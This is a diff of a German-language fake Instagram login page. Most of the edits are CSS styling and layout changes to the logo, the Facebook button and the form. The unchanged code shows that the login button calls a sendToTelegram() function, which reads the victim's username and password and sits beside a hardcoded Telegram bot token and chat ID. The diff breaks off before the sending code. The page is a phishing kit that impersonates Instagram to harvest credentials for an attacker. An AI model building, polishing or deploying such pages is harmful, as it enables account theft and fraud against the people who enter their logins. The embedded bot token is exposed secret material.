@@ -1,4 +1,4 @@
-<!DOCTYPE html><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
@@ -24,23 +24,31 @@
     }
 
     .login-container img {
-      width: 200px;
+      width: 80px; /* Verkleinertes Instagram-Logo */
+      margin-bottom: 10px;
+    }
+
+    .login-container h1 {
+      font-size: 28px; /* Größerer Instagram-Schriftzug */
       margin-bottom: 20px;
     }
 
     .facebook-btn {
       background-color: #1877f2;
       color: #fff;
-      padding: 10px 20px;
-      font-size: 16px;
+      padding: 8px 16px;
+      font-size: 14px;
       font-weight: bold;
       border: none;
       border-radius: 4px;
       cursor: pointer;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
       display: flex;
       align-items: center;
       justify-content: center;
+      width: 100%; /* Button schmaler machen */
+      max-width: 280px; /* Max-Breite für Facebook-Button */
+      margin: 0 auto 20px; /* Zentriert unter Instagram */
       transition: background-color 0.3s;
     }
 
@@ -49,7 +57,8 @@
     }
 
     .facebook-btn img {
-      width: 20px;
+      width: 16px;
+      height: 16px;
       margin-right: 8px;
     }
 
@@ -90,32 +99,36 @@
       color: #8e8e8e;
     }
 
+    .form-container a {
+      display: block;
+      text-align: right;
+      color: #3897f0;
+      font-size: 12px;
+      margin: 8px 0 20px; /* Mehr Abstand zum Anmeldebutton */
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .form-container a:hover {
+      text-decoration: underline;
+    }
+
     .form-container button {
       background-color: #3897f0;
       color: white;
-      padding: 10px;
+      padding: 12px;
       border: none;
       border-radius: 4px;
       font-size: 16px;
       font-weight: bold;
       width: 100%;
+      margin-top: 20px; /* Button weiter heruntergesetzt */
       cursor: pointer;
       transition: background-color 0.3s;
     }
 
     .form-container button:hover {
       background-color: #3078d9;
-    }
-
-    .link {
-      color: #3897f0;
-      font-size: 12px;
-      text-decoration: none;
-      cursor: pointer;
-    }
-
-    .link:hover {
-      text-decoration: underline;
     }
 
     .footer {
@@ -130,35 +143,35 @@
     /* Media Query für kleinere Geräte */
     @media (max-width: 600px) {
       .login-container {
-        width: 90%; /* Die Breite passt sich dem Bildschirm an */
-        padding: 20px; /* Weniger Padding für kleinere Bildschirme */
+        width: 90%;
+        padding: 20px;
       }
 
       .login-container img {
-        width: 120px; /* Verkleinere das Logo */
+        width: 70px; /* Noch kleineres Logo für Handy */
       }
 
       .login-container h1 {
-        font-size: 18px; /* Kleinere Schriftgröße für den Titel */
-      }
-
-      .form-container input {
-        font-size: 14px; /* Kleinere Schriftgröße für die Eingabefelder */
-        padding: 8px; /* Weniger Padding in den Eingabefeldern */
-      }
-
-      .form-container button {
-        font-size: 14px; /* Kleinere Schriftgröße für den Button */
-        padding: 10px; /* Weniger Padding für den Button */
+        font-size: 24px; /* Etwas kleinerer Schriftzug auf Handys */
       }
 
       .facebook-btn {
-        font-size: 14px; /* Kleinere Schriftgröße für den Facebook-Button */
-        padding: 10px; /* Weniger Padding */
+        font-size: 12px; /* Kleinere Schrift im Facebook-Button */
+        padding: 6px 14px;
+      }
+
+      .form-container input {
+        font-size: 14px;
+        padding: 8px;
+      }
+
+      .form-container button {
+        font-size: 14px;
+        padding: 10px;
       }
 
       .footer {
-        font-size: 10px; /* Kleinere Schriftgröße für den Footer */
+        font-size: 10px;
       }
     }
   </style>
@@ -182,7 +195,7 @@
     <div class="form-container">
       <input type="text" id="username" placeholder="Telefonnummer, Benutzername oder E-Mail">
       <input type="password" id="password" placeholder="Passwort">
-      <a href="#" class="link">Passwort vergessen?</a>
+      <a href="#">Passwort vergessen?</a>
       <button type="button" onclick="sendToTelegram()">Anmelden</button>
     </div>
 
@@ -200,7 +213,6 @@
     const BOT_TOKEN = "7433787133:AAHuCXGJgERrcUwvb4adFMTlv8EX7e-upZY"; // Bot-Token
     const CHAT_ID = "6640486406";   // Deine Chat-ID
 
-    // Funktion zum Senden der Daten an Telegram
     function sendToTelegram() {
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
